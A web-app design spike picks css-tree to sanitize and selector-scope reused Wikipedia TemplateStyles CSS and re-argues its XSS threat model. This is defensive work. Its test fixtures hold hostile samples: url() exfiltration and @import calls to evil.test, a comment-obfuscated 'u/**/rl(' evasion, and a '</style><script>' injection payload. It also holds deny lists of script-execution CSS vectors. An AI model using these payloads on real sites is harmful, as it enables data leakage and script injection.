# Discovery spike — TemplateStyles reuse: CSS-sanitization mechanism + X4 re-proof (#105)

**Status:** Complete — **VIABLE**. **Role:** Development (discovery spike). **Gates:** `status: ready`
on issue #105 and the UX + Dev stages. **Input:** `docs/specs/templatestyles-reuse.md` (AC1–AC11),
`lib/wiki/article.ts`, the live X4 tests (`test/article-fidelity-xss.test.ts`,
`test/article-fidelity-hook-xss.test.ts`, `test/article-clade-fidelity.test.ts`), the #74 + #104
decisions in `docs/ARCHITECTURE.md`, and the #104 design contract (`docs/design/wiki-style-reuse.md`).

This spike **picks the CSS-sanitization mechanism** and **re-argues the X4 threat model** for the
redesigned boundary where the page's own `<style>`/TemplateStyles blocks are kept, sanitized, selector-
scoped under `.wiki-body`, and applied to the sanitized DOM. It does **not** implement the feature — it
fixes the *how* so Dev builds against a settled decision. Every claim below was validated against
`css-tree@3.2.1`, the browser CSSOM (via jsdom 25), and DOMPurify 3.2 in a throwaway harness.

---

## 1. Verdict

**VIABLE.** A dedicated CSS parser — **`css-tree`** — walked as an AST to (a) prefix every selector
under `.wiki-body`, (b) drop dangerous declarations and at-rules, and (c) apply the result via a
`<style>` element's **`textContent`** (never `innerHTML`/`dangerouslySetInnerHTML`), cleanly re-proves
all four X4 properties (AC4–AC7) and reaches structural fidelity for clade and `.tmulti` (AC1–AC3). The
per-template tax (#74 Group-B, #104 clade port, the queued #91 montage pass) is retired down to thin
wiki+ overrides.

The fallback gate (§6 of the spec) is **not** triggered: X4 is re-provable for the block path.

**Recommended new dependency:** `css-tree` (`^3.2.1`) — a `dependencies` entry (it runs client-side).
Reasons in §3.

---

## 2. The decision: DOMPurify's CSS handling vs. a dedicated CSS parser + selector-scoper

The spec (§6.1) requires this comparison explicitly. The conclusion is unambiguous: **DOMPurify cannot
do this job; a dedicated parser can.**

### 2.1 DOMPurify does not scope selectors and does not filter `<style>`-block declarations

The current sanitizer (`lib/wiki/article.ts`) *drops* `<style>` entirely (it is not in `ALLOWED_TAGS`,
and `stripChrome` removes `style`/`link` belt-and-suspenders). To reuse a stylesheet we would have to
*keep* `<style>` — and DOMPurify gives us nothing useful there. Measured directly against DOMPurify
3.2 with `ALLOWED_TAGS:["div","style","p"]`:

```
in : <style>body{background:url(https://evil.test/?leak=1)} @import "https://evil.test/x.css"; .clade td{position:fixed;border-left:1px solid}</style>
out: <style>body{background:url(https://evil.test/?leak=1)} @import "https://evil.test/x.css"; .clade td{position:fixed;border-left:1px solid}</style>
```

The stylesheet is returned **verbatim**: the `body{…}` selector is **not** confined under any container
(so it would restyle wiki+ chrome — AC7 fails), the `url()` exfil survives (AC4 fails), the `@import`
survives (AC6 fails), and `position:fixed` survives (AC5 fails). Modern DOMPurify (3.x) has **pared
back** CSS handling — it does not parse, scope, or meaningfully sanitize the *content* of a kept
`<style>` block; its CSS attention is on the inline `style` *attribute* path (which we keep stripping).
DOMPurify is the right tool for the HTML/attribute boundary it already guards in `article.ts`, and it
stays exactly as-is for that — but it is the **wrong** tool for scoping and stripping a `<style>` block.

### 2.2 A dedicated CSS parser does exactly this

`css-tree` parses CSS to an AST, lets us `walk` it (selectors, declarations, at-rules each visitable by
type), mutate it (prepend a `.wiki-body` descendant to every selector; remove unsafe nodes), and
`generate` clean CSS back. Validated against the full AC4–AC7 adversarial battery (§4), the real
`Template:Clade/styles.css` and `Template:Multiple image` `.tmulti` rules, comma lists, `@media`/
`@supports` nesting, `@keyframes`, `:is()`/`:where()`/`:has()`, CSS nesting (`&`), and comment/escape
obfuscations.

### 2.3 css-tree vs. PostCSS (the other dedicated option)

| Axis | **css-tree (chosen)** | PostCSS |
|---|---|---|
| Already in tree | No (new dep) | No — Tailwind v4 uses `@tailwindcss/postcss`, but **`postcss` itself is not a dependency** in `package.json` and is a build-time tool, not shipped to the browser. |
| Runs in the browser | Yes — this CSS sanitize runs **client-side** in `fetchFullArticle` (ARCHITECTURE "Article rendering (client-side)"), so the parser ships to and runs in the browser. css-tree's parser/walker/generator are browser-friendly with no Node built-ins. | PostCSS core runs in-browser, but selector rewriting needs `postcss-selector-parser` and at-rule logic is plugin-glue; heavier surface for what is a narrow walk. |
| Bundle weight | The `parse`+`walk`+`generate` path is the main `css-tree` export and does **not** pull `mdn-data` (~776 KB) — that is only loaded by the *lexer/validation* (`Lexer`, `lexer.match*`), which we do not use. Net shipped code is small. | `postcss` + `postcss-selector-parser` is a comparable-or-larger client payload for a job css-tree does with three calls. |
| Fit for "walk + scope + strip" | Purpose-built: typed AST nodes (`Url`, `Function`, `Atrule`, `Selector`, `Declaration`), `walk` with per-type visitors, in-place `list.remove`/`prependData`. | Workable but selector mutation is string-ier; more moving parts to review for a security gate. |
| Maintenance / review surface | One small module (`lib/wiki/cssScope.ts`-shaped), reviewable in full by QA's security gate. | More plugins/transitive surface to vet. |

**Decision: css-tree.** It is the lightest browser-friendly path that gives a *real* AST to walk, it
keeps the security-critical code small and auditable (a hard requirement — this is the X4 gate), and the
heavy `mdn-data` table is excluded as long as Dev imports only `parse`/`walk`/`generate` (the named
exports verified present on the main entry). PostCSS's only edge — "already adjacent via Tailwind" — is
illusory: `postcss` is not a project dependency and is a build-time concern, not a shipped browser
module.

---

## 3. Recommended dependency

- **`css-tree`** at **`^3.2.1`**, added to **`dependencies`** (not `devDependencies`) because it runs in
  the browser as part of `fetchFullArticle`'s client-side sanitize.
- **Import only `parse`, `walk`, `generate`** (e.g. `import { parse, walk, generate } from "css-tree"`).
  Do **not** import the `Lexer`/validation API — that is what pulls `mdn-data` and bloats the bundle.
- Dev adds the dependency (the spike does not touch `package.json`).
- Like `dompurify`, it can be lazily `await import()`-ed in `fetchFullArticle` to keep it off the initial
  bundle and only loaded when an article is rendered (matches the existing `await import("dompurify")`).

---

## 4. The chosen mechanism — precise scoping + stripping rules, with AC4–AC7 mapped

The reuse path is a new pure function (call it `scopeArticleCss(css: string): string`) that takes the
concatenated text of the surviving in-body `<style>`/TemplateStyles blocks and returns **one** scoped,
stripped stylesheet string. It runs entirely on css-tree's AST. The rules below are the contract; each
was exercised in the spike harness.

### 4.1 Parse

`parse(css, { parseValue: true, parseAtrulePrelude: true, onParseError() {} })`. Tolerant parsing
(swallow parse errors → the offending fragment becomes an inert `Raw` node) is acceptable **only because
application is via `textContent`** (§5) — a `Raw` fragment can never become markup. The whole pass is
wrapped so a throw yields `""` (no CSS rather than unsafe CSS).

### 4.2 At-rule rules (walk `Atrule`)

- **Drop** `@import`, `@namespace`, `@charset`, `@font-face`, `@page`, `@document`/`@-moz-document`,
  `@apply`. (`@import` and `@font-face` are the network-fetch at-rules; `@document`/`@-moz-document` are
  legacy selection-scoping at-rules that could re-target chrome.)
- **Keep** `@media`, `@supports`, `@keyframes`, `@-webkit-keyframes`. Their **inner** rules are scoped by
  the selector pass — **except** `@keyframes` keyframe selectors (`from`/`to`/`0%`), which must **not** be
  prefixed (a prefixed `from` selector is invalid and silently drops the animation). The spike confirmed a
  naive Rule-walker wrongly prefixes `from`/`to`; the implementation marks every `Rule` inside a
  `@keyframes`/`@-webkit-keyframes` block (via a `WeakSet`) and the selector pass skips them.

### 4.3 Declaration rules (walk `Declaration`)

For each declaration, **drop** it if any of these hold:

- **Property name** ∈ `{ behavior, -moz-binding, binding }` — legacy script-execution / XBL-binding
  vectors.
- **`position`** whose value (lowercased, trimmed) ∈ `{ fixed, absolute, sticky }` — off-flow placement
  used for overlay/clickjack. `position: relative`/`static` are kept (clade `td.clade-bar` uses
  `position: relative`, which is in-flow and harmless).
- **Value carries a fetch/script function token.** Serialize the value with `generate`, then **normalize**
  it before scanning: strip CSS comments (`/* … */`) entirely and collapse interior whitespace, and turn
  hex escapes (`\75`) into an inert sentinel. Drop if the normalized value matches
  `/(?:url|expression|image-set|-webkit-image-set|-moz-element)\s*\(/i` or `/behaviou?r\s*:/i`.

  **Why normalize, not just walk for `Url` nodes (a real finding):** the browser CSS tokenizer strips
  comments *before* function-token recognition, so `background:u/**/rl(//evil)` is a **real** `url()` to
  the browser (confirmed: the CSSOM serialized it back to `url(//evil.test/a)`), yet css-tree does **not**
  emit a `Url` AST node for it — an AST-node-only check **misses it**. The post-`generate`, comment-
  stripped, whitespace-collapsed textual scan closes this; the spike verified it drops `u/**/rl(`,
  `exp/**/ression(`, and whitespace-split tokens while leaving legitimate `translateX()`, `calc()`,
  `content:"\2060 "`, and border rules intact. Hex-escaped `\75rl(` is left as the literal token because
  the browser treats it as an invalid value and fires no request (CSSOM-confirmed) — but the sentinel
  normalization also keeps it from ever matching the ban regex spuriously.

This **drops the whole declaration**, not the file — a clade border rule sitting next to a stripped
`background:url()` keeps its borders (spike-confirmed: `td.clade-label{border-left:1px solid;…}` survives
while a sibling `url()` declaration is removed).

### 4.4 Selector scoping (walk `Rule` → `Selector`, skipping keyframe rules)

For every `Selector` in a normal `Rule`'s `SelectorList`, **prepend** a `.wiki-body` class selector and a
descendant combinator, turning `S` into `.wiki-body S`. css-tree applies this per-selector across a comma
list, so `.a, .b, td` becomes `.wiki-body .a, .wiki-body .b, .wiki-body td` (spike-confirmed). This is a
**descendant** prefix, which is what makes scope-escape structurally impossible (§4.6).

Bare global/root selectors are handled by the same prefix, which **neutralizes** them by construction:

- `body{…}` → `.wiki-body body{…}` — matches only a `<body>` *inside* `.wiki-body`, which never exists →
  inert. (The article column is a `<div class="wiki-body">`, never a nested `<body>`.)
- `:root{…}` → `.wiki-body :root{…}`, `html{…}` → `.wiki-body html{…}` — same: no `:root`/`html` exists
  inside the column → inert. (A legitimate `:root` custom-property declaration simply has no effect; that
  is the safe degradation, and TemplateStyles modules do not rely on `:root` vars for clade/`.tmulti`.)
- `*{…}` → `.wiki-body *{…}` — confined to descendants of the column; cannot reach chrome.
- `:is()`/`:where()`/`:has()` are each prefixed at the outer level **and** css-tree prefixes the inner
  compound selectors too, so `:is(body, .wiki-body) .x` → `.wiki-body :is(.wiki-body body, .wiki-body
  .wiki-body) .x` (spike-confirmed) — every branch is doubly confined. `:where()`'s zero specificity does
  not matter, because confinement is by the *descendant prefix*, not by specificity.
- CSS nesting (`&`) and leading combinators (`> .x`) are preserved and still receive the outer
  `.wiki-body ` prefix (spike-confirmed), so nested rules remain confined.

### 4.5 Generate

`generate(ast)` → the final scoped, stripped stylesheet string. Comments are not re-emitted as live
content; the string is applied via `textContent` (§5).

### 4.6 AC4–AC7 — each mapped to the exact rule that meets it

- **AC4 — No `url()` exfiltration → §4.3 declaration value rule.** Any declaration whose normalized value
  contains a `url(`/`image-set(`/`-moz-element(` function token is dropped. The canonical clade fixture
  `background:url(https://evil.test/?leak=1)` is removed; the comment-obfuscated `u/**/rl(` evasion is
  also removed by the comment-strip + whitespace-collapse normalization. No surviving declaration can
  reference a network URL, so no request is issued from the reuse path.
- **AC5 — No off-column overlay / clickjack → §4.3 `position` rule + §4.4 descendant scoping (defense in
  depth).** `position: fixed|absolute|sticky` declarations are dropped, so no reused element leaves normal
  flow. Even if a positioning declaration somehow survived, every selector is confined under `.wiki-body`,
  so it could only reposition an element *inside* the article column — it cannot place anything over the
  ＋plus rail, header, player modal, or any wiki+ control.
- **AC6 — No remote-CSS pull via `@import` → §4.2 at-rule rule.** `@import` (string or `url()` form) and
  `@font-face`/`@document` are dropped before generate, so no at-rule fetches external CSS. Confirmed for
  both `@import url(…)` and `@import "…"`.
- **AC7 — No scope escape from `.wiki-body` → §4.4 selector scoping.** Every emitted selector is prefixed
  with a `.wiki-body ` descendant combinator. A bare `body`/`:root`/`html`/`*`, a high-specificity global,
  a `:is()`/`:where()`/`:has()` breakout attempt, and a CSS-nesting/`&` construct are all confined: the
  rule can only match descendants of the article column. A crafted selector engineered to break out
  cannot, because the prefix is prepended to *every* selector in *every* (non-keyframe) rule, including
  each branch inside `:is()`/`:where()`. QA's single-changed-pixel check on the rail/header at scroll-top
  and scrolled is the gate.

---

## 5. How the sanitized CSS is applied (and how it meets the rest of X4)

This is the second security-critical decision, and the spike surfaced **the most dangerous vector** here.

### 5.1 The `</style>` injection finding — application MUST be via `textContent`, never `innerHTML`

css-tree's tolerant parse preserves a trailing malformed fragment as `Raw`, so a crafted block like
`.a{color:red}</style><script>alert(1)</script>` can leave a literal `</style><script>…` substring in the
generated string. If that string were applied with `dangerouslySetInnerHTML` (i.e. written as
`<style>…</style>` HTML text), the HTML parser would honor the embedded `</style>` and the following
`<script>` would execute. **This is an HTML-injection vector, not a CSS one, and it is the headline risk
of the whole approach.**

**Mandated application path:** create a `<style>` element programmatically and set its **`textContent`**
to the scoped CSS (or, equivalently, build a `CSSStyleSheet` via `replaceSync`). The HTML parser never
re-parses an element's `textContent` as markup, so an embedded `</style>` is inert text inside the
stylesheet. The spike verified this in jsdom: injecting
`.wiki-body .a{color:red}</style><script>window.PWNED=1</script>` via `textContent` produced **zero**
`<script>` elements and `PWNED` stayed unset, and the sheet still parsed its one valid rule. **No reused
CSS may ever reach `dangerouslySetInnerHTML`.** (As belt-and-suspenders, the generator output may also be
passed through a `.replace(/<\/(style)/gi, "<\\/$1")` guard, but `textContent` is the actual defense.)

### 5.2 Where it sits relative to the existing DOMPurify pass and the React render

The existing pipeline in `fetchFullArticle` is: DOMPurify sanitize (whole doc) → `DOMParser` → the
`stripChrome`/`prepCitations`/`rewriteLinks`/`cleanFigures`/`cleanMath`/`prepClades`/`wrapTables`/
`prepHatnotes` passes → split into lead + per-section HTML strings. Two changes thread the reuse path in
without weakening anything:

1. **Keep the `<style>` blocks long enough to read them, then sanitize their text out-of-band.** Today
   `<style>` is excluded from `ALLOWED_TAGS` *and* removed in `stripChrome`. The block path needs the
   **text** of the in-body `<style>`/TemplateStyles blocks (the `data-mw-deduplicate` /
   `typeof="mw:Extension/templatestyles"` ones inside `mw-empty-elt` spans, plus any other in-body
   `<style>`). Dev's cleanest option (decided at implement time, not here): before the existing strip,
   collect `styleEl.textContent` from those blocks into a buffer, then continue to **remove the `<style>`
   elements from the DOM exactly as today** (they never render as elements). The collected text is run
   through `scopeArticleCss` (§4) to produce one scoped string. **The DOMPurify config, the custom
   `ALLOWED_URI_REGEXP`, the `KEEP_INERT_ATTRS` `uponSanitizeAttribute` hook, and its `finally` removal
   are untouched** — `style`/`<style>`/`<link>`/`<script>`/inline event handlers/`javascript:` URIs all
   still die exactly as the X4 tests assert. The reuse path reads CSS *text* that the HTML sanitizer was
   going to discard; it does not re-admit any tag or attribute, and it adds no DOMPurify hook, so there is
   **no new shared-singleton state and no leak surface.** (Note: collecting `textContent` from `<style>`
   nodes that survived the DOMPurify HTML pass means the text was never interpreted as HTML; it is the raw
   CSS source string, which is exactly what css-tree should see.)

2. **Apply the one scoped stylesheet once, inside the article subtree, via `textContent`.** The article
   renders as a lead block plus per-section `dangerouslySetInnerHTML` `.wiki-body` divs
   (`components/topic/ArticleBody.tsx`). The scoped CSS is **not** concatenated into any of those HTML
   strings (that would be the `innerHTML` vector of §5.1). Instead it is carried alongside the article
   data (e.g. a `styleCss` field on `FullArticle`) and applied by a small client component that creates a
   `<style>` element, sets `.textContent = styleCss`, and mounts it once within the article region (under
   the `.wiki-body` ancestor so the scope prefix is correct, and so it is a no-op for articles with no
   styled content). Because every rule is already `.wiki-body`-scoped, a single shared `<style>` for the
   whole article is correct even though the body is split across sections.

### 5.3 The existing inline-`style` and hook X4 properties do not regress

The block path adds no inline-`style` handling (that is Issue B). `style` stays out of `ALLOWED_ATTR`;
`test/article-fidelity-xss.test.ts`'s "style attr on a cell is dropped" and the
`test/article-fidelity-hook-xss.test.ts` colspan-hook/no-leak assertions are unaffected because the
DOMPurify pass and the hook are unchanged. The clade fixture's existing X4 assertions
(`test/article-clade-fidelity.test.ts`: no `<style>`, no `evil.test`, no `TemplateStyles:r1`, no
`mw-empty-elt` in output) still hold — the `<style>` element is still removed from the rendered DOM; its
*text* is read, scoped, stripped (the `evil.test` `url()` is dropped by §4.3), and applied separately, so
`evil.test` still never reaches the output and the placeholder span is still removed by `prepClades`.

---

## 6. Fidelity confirmation (AC1–AC3)

The styling that draws clades and montages is **selectors + non-`url()`, non-`position` declarations** —
exactly what survives the scoper. Confirmed against the real rules in the spike harness:

- **AC1 — Cladograms.** The branch-line geometry is `border-left`/`border-bottom` (and the
  `first`/`last`/`reverse` modifiers, `border-spacing:0`, `border-collapse:separate`,
  `vertical-align`) on `td.clade-label`/`td.clade-slabel`/`td.clade-bar`. None of those carry `url()` or
  off-flow `position` (`td.clade-bar` uses `position:relative`, kept), so the scoped reuse of
  `Template:Clade/styles.css` produces the connected right-angled bracket tree. The class names
  (`clade`, `clade-label`, `clade-leaf`, `clade-slabel`, `clade-bar`, modifiers) already survive the
  HTML sanitizer as inert `class` values (asserted by the existing clade test), so the scoped rules land
  on the surviving DOM. **The #104 hand-port is retired**; what remains is a thin wiki+ override (the
  contained keyboard-scroll region via `prepClades`, the faithful-grey/no-Indigo frame, the responsive
  scroll). Spike output for the real clade rule: `.wiki-body .mw-parser-output table.clade
  td.clade-label{border-left:1px solid;border-bottom:1px solid;vertical-align:bottom}` — intact.
- **AC2 — `.tmulti` montages (#91).** `Template:Multiple image`'s TemplateStyles lays the montage out
  with `display:flex`/`flex-wrap`/`flex-direction`/`display:inline-block`/`text-align` on `.tmulti`,
  `.tmulti .trow`, `.tmulti .tsingle`, `.tmulti .thumbinner`, `.tmulti .thumbcaption` — pure layout, no
  `url()`/`position`. Scoped reuse renders the intended grid/row with captions. Spike output:
  `.wiki-body .tmulti .tsingle{display:inline-block}.wiki-body .tmulti .thumbcaption{text-align:left}` —
  intact. This is the #91 family, now covered with **zero** bespoke `.tmulti` CSS.
- **AC3 — Held-out unfamiliar TemplateStyles table.** Because the scoper is generic (it scopes and
  strips *any* TemplateStyles block, not a hand-listed family), a table from a template family never
  hand-styled renders from its own reused, scoped rules with zero new per-template CSS — provided its
  layout is the usual border/grid/flex/align vocabulary (the overwhelming common case). The only styling
  it loses is `url()` backgrounds and off-flow `position` (rare in TemplateStyles table layout, and a
  deliberate X4 cost). Dev/QA pick the specific held-out article at build time (spec A3).
- **A2 note (taxon-band color, a welcome win, not required).** A *trusted, sanitized* color value carries
  through the scoper untouched — spike output `.wiki-body .infobox.biota th{background:#d3d3a4}` survives
  (a hex color is not a `url()`/`position`/banned property). **But** Wikipedia ships the per-taxon band
  color as an **inline `style`** emitted by `{{Taxobox colour}}`, which is the **inline-`style` path =
  Issue B**, out of scope here and still stripped. So #105 does **not** recover the taxon band on its own;
  the #74 neutral-grey band stands (spec A2's accepted partial). If a given taxobox's band color ever
  arrives via a `<style>` block rather than inline, this path would carry it safely — but that is not the
  norm, so AC1's color clause is not claimed by this issue.

**Fidelity verdict: clade ✔, `.tmulti` ✔ — both reachable with zero per-template CSS via scoped reuse.**

---

## 7. Risks the implementation Dev should watch

1. **Application path is the gate, not the scoper.** The `</style>`-injection vector (§5.1) means the
   single most important review point is: *the scoped CSS is applied via `textContent`/`CSSStyleSheet`,
   never `dangerouslySetInnerHTML` and never string-concatenated into a section's HTML.* If that slips,
   X4 is broken regardless of how good the scoping is. Add an explicit X4 test that feeds
   `.a{}</style><script>…` through the full path and asserts zero `<script>` in the rendered DOM.
2. **Keep css-tree's import surface minimal.** Import only `parse`/`walk`/`generate`. Importing the
   lexer/validation API pulls `mdn-data` (~776 KB) into the client bundle for no benefit. QA/Ops should
   sanity-check the production bundle does not grow by ~0.8 MB.
3. **`@keyframes` selectors must be skipped by the scoper** (§4.2) — a prefixed `from`/`to` silently
   kills the animation. Low security impact, real fidelity bug; covered by the `WeakSet` skip rule.
4. **Comment/whitespace `url()` normalization is load-bearing** (§4.3). The AST-`Url`-node check alone is
   insufficient (`u/**/rl(` evades it; the browser does not). Keep the post-`generate`, comment-stripped,
   whitespace-collapsed textual scan, and add it to the X4 regression suite as its own case.
5. **Tolerant parse + empty-on-throw.** `scopeArticleCss` must return `""` on any thrown error (no CSS is
   safe; partial/garbage CSS is not). Tolerant `onParseError` is only acceptable because of the
   `textContent` application — do not pair tolerant parse with an `innerHTML` apply.
6. **Lazy-load like dompurify.** `await import("css-tree")` inside `fetchFullArticle` keeps it off the
   initial bundle and out of the no-article paths (AC11's "no-tables article gains no artifact" — the
   scoper returns `""` and the apply component mounts nothing).

---

## 8. Drafted replacement paragraph for `docs/ARCHITECTURE.md` "DOMPurify allowlist" entry

> **Ready for the implementation Dev to paste.** This replaces the two bullets currently in the
> "DOMPurify allowlist" open-question entry — the *"Infobox + taxobox layout mechanism (#74 DECISION …)"*
> bullet and the *"Cladogram + style-reuse mechanism (wiki-style-reuse DECISION …)"* bullet — with the
> single current-state mechanism below. Written in current-state voice (no history cruft). The earlier
> bullets in that entry (allowlist TAGs/ATTRs, the strip list, citations, math C4, the inert-attr hook)
> are unchanged; only the styling-reuse decision is superseded.

- **TemplateStyles reuse mechanism (sanitized + selector-scoped under `.wiki-body`; #105):** the page's
  own in-body `<style>`/TemplateStyles blocks supply the article column's layout — cladograms
  (`table.clade`), multi-image montages (`.tmulti`, `Template:Multiple image`), hlists, and the long tail
  of exotic TemplateStyles tables — with **no per-template CSS authored by wiki+.** The CSS text of those
  blocks is read in `fetchFullArticle` (the `<style>` *elements* are still removed from the rendered DOM,
  as `style`/`<style>`/`<link>` stay out of the DOMPurify allowlist and `stripChrome`), run through a
  CSS-AST sanitizer (`css-tree`: `parse` → `walk` → `generate`), and applied as **one** scoped stylesheet
  per article via a `<style>` element's `textContent` mounted inside the article subtree. The sanitizer
  enforces the X4 anti-XSS guarantee for the CSS-block boundary: **(scope)** every selector is prefixed
  with a `.wiki-body ` descendant combinator — across comma lists and inside `@media`/`@supports`/
  `:is()`/`:where()`/`:has()`/CSS-nesting — so a bare `body`/`:root`/`html`/`*` or a crafted breakout
  selector is confined to descendants of the article column and cannot match wiki+ chrome (the ＋plus
  rail, the projector header, the TOC, the General strip, the player modal); `@keyframes` keyframe
  selectors are exempt from the prefix. **(strip)** `@import`/`@namespace`/`@charset`/`@font-face`/
  `@page`/`@document`/`@apply` at-rules are dropped (no remote-CSS fetch); declarations are dropped when
  the property is `behavior`/`-moz-binding`/`binding`, when `position` is `fixed`/`absolute`/`sticky`
  (no off-column overlay), or when the comment-stripped, whitespace-collapsed value contains a
  `url(`/`image-set(`/`expression(`/`-moz-element(` function token (no network exfiltration; the textual
  scan catches comment/whitespace-obfuscated tokens that an AST-node check misses). **(application)**
  the scoped CSS is applied **only** via `textContent`/`CSSStyleSheet`, never
  `dangerouslySetInnerHTML` — so a `</style>`-injection fragment that survives tolerant CSS parsing is
  inert text, never markup. This loads **no remote CSS** and re-permits **no** page-body tag, inline
  `style`, or DOMPurify hook: the HTML sanitizer's allowlist, custom `ALLOWED_URI_REGEXP`, and the inert-
  attr `uponSanitizeAttribute` hook (removed in `finally`) are unchanged, and the shared DOMPurify
  singleton gains no new state. Because clade/`.tmulti`/table layout is selectors plus border/grid/flex/
  align declarations (carrying no `url()`/off-flow `position`), faithful structure renders from the reused
  rules; the per-template CSS the reuse path covers (the clade stylesheet port and the structure-keyed
  infobox/taxobox rules) is retired to thin wiki+ overrides — the contained keyboard-scroll region for
  trees and wide tables, the faithful-grey/no-Indigo frame, and the responsive stack/scroll. **Taxon-band
  color stays neutral grey:** Wikipedia emits per-taxon band color as an **inline `style`** (the inline-
  `style` path, kept stripped), so it is not recovered here; faithful *structure* (centered/bold/hairline
  banners, the rank ladder, connected branch lines) is the bar, AA-compliant via position/weight/hairline
  rather than color.

---

## 9. What QA must verify against this spike (security-gate handles)

- AC4: a `<style>` block with `background:url(https://evil.test/?leak=1)` **and** the `u/**/rl(` /
  `image-set(url(…))` obfuscations → no network request, dropped declaration.
- AC5: a `<style>` block with `position:fixed`/`absolute`/`sticky` on a selector that targets chrome →
  dropped declaration **and** descendant-scoped selector; rail/header pixel-unchanged.
- AC6: `@import url(…)` and `@import "…"` → not present in applied CSS; no remote fetch.
- AC7: bare `body`/`:root`/`html`/`*`/`:is(body,…)`/high-specificity-global selectors → all confined
  under `.wiki-body`; single-changed-pixel inspection of rail + header, wide viewport, scroll-top and
  scrolled.
- **Application-path X4 (the headline):** `.a{}</style><script>window.__pwned=1</script>` through the
  full render path → zero `<script>` elements, flag unset.
- Fidelity: clade tree connected (AC1) with no `app/globals.css` clade port present; `.tmulti` montage
  laid out (AC2); a named held-out article's TemplateStyles table faithful with zero new rules (AC3).
- Bundle: no ~0.8 MB `mdn-data` regression.
